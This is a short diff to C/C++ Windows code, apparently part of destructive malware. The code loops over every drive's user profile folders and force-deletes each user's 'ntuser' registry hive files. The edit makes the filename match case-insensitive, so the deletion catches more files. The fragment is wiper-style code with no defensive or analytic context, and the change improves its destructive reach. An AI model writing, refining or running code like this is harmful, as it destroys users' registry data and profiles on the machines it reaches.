@@ -306,7 +306,7 @@ int main() {
 					wcscpy(user, file);
 					wsprintf(path, L"%c:\\Users\\%ws\\*", drive, user);
 					ForEachFile(path, {
-						if (StrStr(file, L"ntuser")) {
+						if (StrStrI(file, L"ntuser")) {
 							wsprintf(path, L"%c:\\Users\\%ws\\%ws", drive, user, file);
 							ForceDeleteFile(path);
 						}
